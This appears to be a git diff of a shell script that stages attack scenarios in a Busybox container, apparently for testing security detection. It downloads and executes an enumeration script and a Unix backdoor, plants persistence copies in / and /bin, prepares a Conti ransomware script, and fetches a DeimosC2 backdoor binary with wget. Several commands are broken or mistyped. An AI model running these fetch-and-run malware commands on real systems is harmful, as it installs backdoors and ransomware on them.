@@ -2,7 +2,8 @@
 # Configured for a Busybox container written by hreed@paloaltonetworks.com
 # APS shell enviorment > standard tools 
 
-# SENARIO --- Script Activity /enumeration 
+# SENARIO 1 --- Script Activity / Linux Enumeration 
+# Outcomes - detect suspicous script activity 
 echo "Senario 1 - Smart Enumartion Script Activity"
 # Step 1 - Download the 
 echo "[+] Downloading enumeration script using wget..."
@@ -18,7 +19,7 @@ echo "[+] Executing enumeration script."
 sh enum_script.sh
 sleep 3
 
-# SENARIO 1 - Malware 
+# SENARIO 2 --- Local Malware 
 echo "Senario 2 - Malware Protection"
 # Step 1 - Unix Backdoor Senario 
 echo "[+] Downloading Unixbackdoor Script "
@@ -27,11 +28,12 @@ chmod 700 unixbackdoor.sh
 sh unix
 sleep 
 
-# Senario 1.A Malware Persistance / Shadow Copies 
+# Senario 1.A Local Malware Persisitance 
 # Create Shadow Copies 
 echo "[+] Creating copies in suspicious pladces"
 cat unixbackdoor.sh > /loader.sh
 chmod 700 /loader.sh
+
 # Additional Shadow Cppies 
 echo "[+] Creating more shadow copies" 
 cat unixbackdoor.sh > /bin/nonsus.sh
@@ -40,7 +42,7 @@ sleep 10
 sh nonsus.sh
 
 # make executaable
-echo "[+] executable"
+echo "[+] Making unixbackdoor executable"
 chmod 700 unixbackdoor.sh
 # execute 
 sh uunixbackdoor.sh
@@ -55,9 +57,8 @@ echo "[+] making conti ransoware executable"
 chmod 700 conti.sh
 sleep 3
 
-
 # Step 3 - c2 
-echo "[+] 
+echo "[+]" 
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -0 c2.sh
 sleep 5
 
